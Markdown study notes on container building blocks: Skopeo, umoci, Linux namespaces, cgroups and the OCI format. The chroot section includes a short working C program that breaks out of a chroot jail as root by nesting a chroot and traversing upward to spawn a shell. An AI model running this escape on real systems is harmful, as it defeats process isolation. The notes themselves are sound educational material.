## Overview
Containers are isolated groups of processes running on a single host, which fulfill a set of “common” features. A container is built using layers, each layer represents some additional functionality. 


## Skopeo
Skopeo inspects a container image, it can perform operations which consist of:
- Copying an image from and to various storage mechanisms. For example you can copy images from one registry to another, without requiring privilege.
- Inspecting a remote image showing its properties including its layers, without requiring you to pull the image to the host.
- Deleting an image from an image repository.
- Syncing an external image repository to an internal registry for air-gapped deployments.
- When required by the repository, skopeo can pass the appropriate credentials and certificates for authentication.

## Umoci
umoci modifies Open Container images

## Chroot
Lets you change the root to a new root, however you can pop out of the environment with a process running as the root user since you can create a new chroot and traverse relatively out of it 
```
#include <sys/stat.h>
#include <unistd.h>

int main(void)
{
    mkdir(".out", 0755);
    chroot(".out");
    chdir("../../../../../");
    chroot(".");
    return execl("/bin/bash", "-i", NULL);
}
```

## Linux namespaces
wrap certain global system resources in an abstraction layer. This makes it appear like the processes within a namespace have their own isolated instance of the resource

seven distinct namespaces implemented: 
- mnt
- pid
- net
- ipc
- uts
- user
- cgroup




## [Cgroups](https://man7.org/linux/man-pages/man7/cgroups.7.html) 
short for "control group," is a Linux kernel feature that allows the management of system resources and sets limits for groups of processes. It provides a way to group processes and manage their resource usage, such as CPU, memory, and I/O bandwidth, among others.

- A cgroup is a collection of processes that are bound to a set of
       limits or parameters defined via the cgroup filesystem.

- A subsystem is a kernel component that modifies the behavior of
       the processes in a cgroup.  Various subsystems have been
       implemented, making it possible to do things such as limiting the
       amount of CPU time and memory available to a cgroup, accounting
       for the CPU time used by a cgroup, and freezing and resuming
       execution of the processes in a cgroup.  Subsystems are sometimes
       also known as resource controllers (or simply, controllers).

- The cgroups for a controller are arranged in a hierarchy.  This
       hierarchy is defined by creating, removing, and renaming
       subdirectories within the cgroup filesystem.  At each level of
       the hierarchy, attributes (e.g., limits) can be defined.  The
       limits, control, and accounting provided by cgroups generally
       have effect throughout the subhierarchy underneath the cgroup
       where the attributes are defined.  Thus, for example, the limits
       placed on a cgroup at a higher level in the hierarchy cannot be
       exceeded by descendant cgroups.

## Open Container Initiative 
An open format for containers and an alternative to Docker. You can read more about the format here: https://ravichaganti.com/blog/2022-10-28-understanding-container-images-oci-image-specification/
